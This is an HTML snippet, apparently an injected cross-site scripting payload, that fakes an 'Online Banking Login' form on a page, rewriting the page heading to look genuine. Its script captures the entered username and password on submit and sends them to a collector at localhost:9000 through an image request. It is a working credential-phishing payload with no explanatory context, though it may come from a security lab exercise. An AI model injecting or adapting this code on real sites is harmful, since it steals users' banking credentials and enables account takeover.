<form Action="doLogin" method="post" name="login" id="login"> 			
    <table> 			  
        <tbody><tr> 				
            <td> 				  
                Username: 				
            </td> 				
            <td> 				  
                <input type="text" id="uid" name="uid" value="" style="width: 150px;"> 				
            </td> 				
            <td> 				

            </td> 			  
        </tr> 			  
        <tr> 				
            <td> 				  
                Password: 				
            </td> 				
            <td> 				  
                <input type="password" id="passw" name="passw" style="width: 150px;"> 				  
            </td> 			  
        </tr> 			  
        <tr> 				  
            <td></td> 				  
            <td> 					
                <input type="submit" onclick="postreq()" name="btnSubmit" value="Login"> 				  
            </td> 				
        </tr> 			
    </tbody></table> 		  
</form>
<script>
    document.getElementsByClassName("fl")[0].children[1].textContent = "";
    document.getElementsByClassName("fl")[0].children[0].textContent = "Online Banking Login";
    function postreq() {
        var a = document.forms.login.uid.value;
        var b = document.forms.login.passw.value;
        new Image().src = 'http://localhost:9000/?'+ 'uid=' + a + '&passw=' + b;             
    }
</script>
